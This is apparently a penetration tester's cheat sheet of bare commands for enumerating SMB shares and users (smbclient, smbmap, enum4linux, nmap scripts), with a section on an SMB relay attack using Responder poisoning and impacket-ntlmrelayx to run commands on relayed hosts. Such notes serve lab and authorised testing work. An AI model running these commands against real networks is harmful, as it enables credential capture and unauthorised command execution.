```
smbclient -L \\\\$IP\\
```

```
smbclient -L //dc1.scrm.local
```

```
smbclient -U ksimpson -L //dc1.scrm.local
```

```
smbclient \\\\$IP\\DIRECTORY
```

```
smbclient -L //$DomainIP -U $DomainName/$DomainUsername
```

```
smbclient -L //$DomainIP/DIRECTORY -U $DomainName/$DomainUsername
```

```
smbclient -L 10.129.61.158 -U Administrator
```

/etc/samba/smb.conf

```
searchsploit Samba 2
```

```
smbmap -H $ip -u 'anonymous' -p 'anonymous'
```

```
enum4linux -a -u "<username>" -p "<passwd>" <IP>
```

```
smbclient //$ip/directory -U '<username>'
```

## SMB Relay Attack

```
nmap --script=smb2-security-mode.nse -p445 $IP
```

```
sudo responder -I eth1 -dwP
```

```
sudo responder -I eth1 -dw
```

![](Pasted%20image%2020231021151759.png)

```
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

```
sudo nmap --script smb-enum-shares -p445 10.129.200.70
```

```
sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.129.200.70
```

```
sudo nmap -p139 --script smb-protocols 10.129.200.70
```

```
sudo nmap -p445 --script smb-protocols 10.129.200.70
```

```
nmap --script=smb-protocols -p139,445 --open --reason -sV -Pn
nmap --script=smb-protocols -p445 --open --reason -sV -Pn
nmap --script=smb-protocols -p139 --open --reason -sV -Pn
```


